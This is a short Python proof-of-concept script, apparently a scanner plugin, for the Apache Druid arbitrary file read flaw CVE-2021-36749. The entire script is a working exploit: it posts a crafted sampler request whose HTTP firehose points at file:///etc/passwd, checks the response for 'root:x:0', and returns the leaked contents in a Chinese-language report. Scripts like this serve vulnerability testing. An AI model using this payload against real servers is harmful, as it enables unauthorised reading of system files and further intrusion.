#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

class Poc(object):


    def verify(self, data):
        url = data['url'].strip('/') + '/druid/indexer/v1/sampler?for=connect'
        headers = data['headers']
        json_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
        try:
            response = requests.post(url, headers=headers, json=json_data, timeout=10, verify=False, allow_redirects=False)
            response_text = response.text
            if 'root:x:0' in response_text:
                return {
                    'title': '{} 存在Apache Druid任意文件读取漏洞(CVE-2021-36749)'.format(url),
                    'desc': '{} 存在Apache Druid任意文件读取漏洞, 返回内容为: {}'.format(url, response_text)

                }
        except Exception:
            pass


if __name__ == "__main__":
    p = Poc()
    r = p.verify({
        'url': 'https://xxx.xxx.xxxx.com',
        'headers': {}
    })
    print(r)